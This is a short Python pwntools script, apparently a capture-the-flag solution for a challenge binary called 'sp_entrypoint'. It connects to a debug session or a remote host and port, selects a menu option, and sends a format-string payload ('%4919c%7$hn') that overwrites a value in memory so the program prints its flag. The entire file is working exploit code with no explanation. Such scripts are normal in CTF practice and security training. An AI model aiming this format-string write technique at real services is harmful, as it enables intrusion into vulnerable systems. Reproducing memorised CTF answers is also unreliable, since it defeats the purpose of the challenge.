#!/usr/bin/env python3


from pwn import *
import sys


def exploit(io):
    
    io.recv()
    io.sendline(b"1")
    io.recvuntil(b"number: ")

    payload = b"%4919c%7$hn"
    io.sendline(payload)
    io.recvuntil(b"passphrase: ")
    flag = io.recv().decode()
    print(flag)




def main():
    if sys.argv[1] == "debug":
        io = gdb.debug("./sp_entrypoint")
    else:
        HOST, PORT = sys.argv[1].split(":")
        io = remote(HOST, PORT)

    exploit(io)


if __name__ == "__main__":
    main()
